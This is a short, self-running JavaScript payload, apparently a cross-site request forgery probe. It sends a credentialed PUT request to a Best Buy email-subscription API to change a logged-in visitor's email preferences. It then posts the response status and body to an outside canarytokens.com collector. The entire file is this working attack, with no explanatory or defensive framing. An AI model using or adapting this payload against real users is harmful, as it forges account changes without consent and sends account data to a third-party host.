function changeEmailPreferences() {
  var xhr = new XMLHttpRequest();
  xhr.open("PUT", "https://www.bestbuy.com/commprefview/api/email-subscription", true);
  xhr.withCredentials = true;
  xhr.setRequestHeader("Content-Type", "application/json");

  xhr.onload = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send("status=" + encodeURIComponent(xhr.status) + "&response=" + encodeURIComponent(xhr.responseText));
  };

  xhr.onerror = function () {
    var reportXhr = new XMLHttpRequest();
    reportXhr.open("POST", "http://canarytokens.com/about/terms/articles/paikxj9vn2mjww8p30yiee87p/post.jsp", true);
    reportXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    reportXhr.send("error=network_or_cors_error");
  };

  xhr.send(JSON.stringify({
    "emailSubscriptions": [{
      "subscriptionId": "1001",
      "frequency": "1XWEEK"
    }]
  }));
}

changeEmailPreferences();
